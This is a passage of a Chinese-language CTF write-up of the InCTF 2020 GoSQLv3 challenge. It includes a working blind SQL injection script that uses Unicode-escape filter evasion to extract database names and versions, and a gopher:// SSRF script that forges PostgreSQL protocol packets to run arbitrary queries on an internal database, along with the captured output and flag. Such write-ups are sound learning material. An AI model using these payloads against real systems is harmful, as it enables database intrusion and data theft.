    (1 row)
这样，变量可被一个字符一个字符的提取出来（第一个字符除外）。
## 资料检索
由于我一直热衷于在遇到的挑战中实现一切自动化，因此我最终使用了以下脚本：
    # -*- coding: utf-8 -*-    
    import requests
    from string import ascii_letters, digits
    import base64
    url = "http://MIRROR"
    #to_exfil = "USER"
    #to_exfil = "version()"
    to_exfil = "current_database()"
    extracted = ""
    offset = 1
    while True:
        for char in ascii_letters + digits + "@{}()\"=[]:;+":
            params = {
                'column': r'U&"\0075\0073\0065\0072\006e\0061\006d\0065",U&"\0067\006f\005f\0074\006f"',
                'name': 'lpad($$a$$||$$d$$||$$m$$||$$i$$||$$n$$,LENGTH((split_part(%s,%s::VARCHAR(%s),2)::VARCHAR(1)=$$%s$$)::TEXT),$$a$$)' % (to_exfil, to_exfil, offset, char)
            }
            req = requests.get(url, params=params, allow_redirects=False)
            #print(params)
            #print(req.headers, extracted)
            if not 'Location' in req.headers:
                if req.text == "Try Hard":
                    continue
                else:
                    extracted += char
                    offset += 1
                print(extracted)
                break
            else:
                if extracted[-5::] == '?'*5:
                    print(f"EXTRACTED {to_exfil}: {extracted[:-5]}")
                    break
                extracted += "?"
                offset += 1
    # USER = oneysingh (honeysingh)
    # version() = (P)ostgreSQL?9?5?21?on?x86?64?pc?linux?gnu??compiled?by?gcc?(Ubuntu?5?4?0?6ubuntu1?16?04?12)?5?4?0?20160609??64?bit
    # current_database() = osqlv3 (gosqlv3)
为什么使用"?"，因为我需要完整的version()。
## 回到SSRF
现在我们知道了用户名和数据库，就可以构建环境了。为了不将gopher数据包弄得太乱，我最终创建了相同的用户和数据库（我对数据包的结构，语法也不太感兴趣……我将其作为长久的主题）。
通过发送此命令，我们将生成所需的流量以进行查询，而我们只需要更改命令（及其长度）即可。
    psql -h 127.0.0.1 -U honeysingh -d "dbname=gosqlv3 sslmode=disable" -c "SELECT 1;"
注意sslmode=disable标志，不要通过TLS发送数据包。  
这是我们必须在脚本中使用的Startup message（aka auth）,将其复制为Hex放到我们的脚本里。  
简单的query也需要上述操作，但其长度是查询的关键  
最后Termination也同样需要
## 一起来完成
    import binascii
    import requests
    def encode(s):
        a = [s[i:i + 2] for i in range(0, len(s), 2)]
        return "gopher://127.0.0.1:5432/_%" + "%".join(a)
    url = "http://MIRROR/feel_the_gosql_series.php"
    while True:
        query = input("SQL> ") # MÁX 122 CHARS
        if len(query) > 122:
            print("Máx 122 chars")
            continue
        query_hex = binascii.hexlify(query.encode()).decode()
        query_hex_packet = query_hex + "00"
        query_len = len(query) + 5
        query_len_packet = binascii.hexlify(chr(query_len).encode()).decode()
        # Startup
        test = "00000055000300007573657200686f6e657973696e676800646174616261736500676f73716c7633006170706c69636174696f6e5f6e616d65007073716c00636c69656e745f656e636f64696e6700555446380000"
        # Query
        test += f"51000000{query_len_packet}{query_hex_packet}"
        # Termination
        test += "5800000004"
        to_send = encode(test)
        req = requests.post(url, data={'url': to_send})
        print(req.text)
  * 编码函数取自Gopherus的MySQL漏洞利用，并且每个两个十六进制字符都用％包围。
  * query_len是查询的实际长度+ 5，数据包值必须是query_len的十六进制值。
  * 122个字符的限制与query_len急剧变化有关。
## 通过非常规方法找到flag
通过列出权限列表，我发现了一个我能使用的已经存在的表名cmd_exe。
    SQL> SELECT grantee,table_catalog,table_schema,table_name,privilege_type FROM information_schema.role_table_grants                                                        
    SomeTimes hard chall is good
    Welcome Back!!! admin !!!
    You have one functionality that you can cURL
    put url : 
    GO
    S→application_namepsqlS↓client_encodingUTF8S↨DateStyleISO, MDYS↓integer_datetimesonSntervalStylepostgresS§is_superuseroffS↓server_encodingUTF8S→server_version9.5.21S%session_authorizationhoneysinghS#standard_conforming_stringsonS§TimeZoneEtc/UTCK♀♠=‼f)Z♣IT♣grantee/☻♦‼table_catalog/♥♦‼table_schema/♦♦‼table_name/♣♦‼privilege_type/♠♦‼D♣
    honeysinghgosqlv3♠public♣eeeeTRUNCATED@♣
    honeysinghgosqlv3♠public♣eeeee
    REFERENCESD=♣
    honeysinghgosqlv3♠public♣eeeeeTRIGGERD?♣
    honeysinghgosqlv3♠publifooooooo♠INSERTD?♣
    honeysinghgosqlv3♠publifooooooo♠SELECTD?♣
    honeysinghgosqlv3♠publifooooooo♠UPDATED?♣
    honeysinghgosqlv3♠publifooooooo♠DELETEDA♣
    honeysinghgosqlv3♠publifooooooTRUNCATEDC♣
    honeysinghgosqlv3♠publifooooooo
    REFERENCESD@♣
    honeysinghgosqlv3♠publifoooooooTRIGGERD♣
    honeysinghgosqlv3♠public♣ddddTRUNCATED@♣
    honeysinghgosqlv3♠public♣ddddd
    REFERENCESD=♣
    honeysinghgosqlv3♠public♣dddddTRIGGERD:♣♣inctfgosqlv3♠publicmd_exec♠INSERTD:♣♣inctfgosqlv3♠publicmd_exec♠SELECTD:♣♣inctfgosqlv3♠publicmd_exec♠UPDATED:♣♣inctfgosqlv3♠publicmd_exec♠DELETED♣♣inctfgosqlv3♠publicmd_exec
    REFERENCESD;♣♣inctfgosqlv3♠publicmd_execTRIGGERD@♣
    honeysinghgosqlv3♠public        inctf2020♠SELECTC♫SELECT 29Z♣I
查询它将获取flag
    L> SELECT * FROM cmd_exec
    SomeTimes hard chall is good
    Welcome Back!!! admin !!!
    You have one functionality that you can cURL   
    put url : 
    GO
    S→application_namepsqlS↓client_encodingUTF8S↨DateStyleISO, MDYS↓integer_datetimesonSntervalStylepostgresS§is_superuseroffS↓server_encodingUTF8S→server_version9.5.21S%session_authorizationhoneysinghS#standard_conforming_stringsonS§TimeZoneEtc/UTCK♀      [qi↕Z♣IT#☺cmd_output☺♥☺↓DM☺CFLAG: inctf{Life_Without_Gopherus_not_having_postgreSQL_exploit_:(}D
    SELECT 2Z♣I
显然，这不是预期获取flag的方法。因为SpyD3r在他的官方的[writeup](https://spyclub.tech/2020/08/02/inctf2020-gosqlv3-challenge-writeup/)中写到："The GoSQLv3 challenge got 8 solves but I would say the only one
full solve that was RCE by the EpicLeetTeam(Congratulations for the first
blood) but mistakenly the team has saved the flag on one of the table and most
of the team just read the flag from that table."
但是，我觉得实际上是这样，因为用户不是超级管理员，也无法从程序或文件复制或Copy to。
但是，SpyD3r分享了如何从具有特权的表中获取特权，如何上载库并以系统用户身份执行命令。但是，因为表名是cmd_exec（这就是每个PostgreSQL速查表中显示的名称），也许使用该set
role技巧就足以从程序中[复制](https://www.postgresql.org/docs/9.5/sql-copy.html)并读取flag。
最后，我要感谢[Tarunkant](https://twitter.com/TarunkantG)（aka
SpyD3r）的支持，因为我喜欢挑战的每一部分并学到了很多东西！同时也要感谢[teambi0](https://twitter.com/teambi0s)的CTF。
希望您喜欢它，或者至少学到了一些东西！
[Jorge](https://0xdf.gitlab.io/2020/05/12/ngrok-ftw.html)
原文地址：